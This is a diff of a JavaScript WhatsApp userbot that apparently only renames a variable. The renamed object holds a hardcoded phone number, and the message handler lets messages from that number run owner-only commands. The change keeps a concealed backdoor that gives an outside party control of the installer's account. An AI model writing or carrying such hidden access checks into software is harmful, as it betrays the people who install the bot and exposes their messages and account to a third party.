@@ -43,7 +43,7 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
 });
 
 const plugindb = require('./plugins/sql/plugin');
-var sourav = { kl11: '916282344739,0' }
+var souravv = { kl11: '916282344739,0' }
 
 // Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
 String.prototype.format = function () {
@@ -390,8 +390,8 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }  
-                   if ((sourav.kl11 == "916282344739,0" && msg.key.fromMe === false && command.fromMe === true &&
-                        (msg.participant && sourav.kl11.includes(',') ? sourav.kl11.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == sourav.kl11 || sourav.kl11.includes(',') ? sourav.kl11.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == sourav.kl11)
+                   if ((souravv.kl11 == "916282344739,0" && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && souravv.kl11.includes(',') ? souravv.kl11.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == souravv.kl11 || souravv.kl11.includes(',') ? souravv.kl11.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == souravv.kl11)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
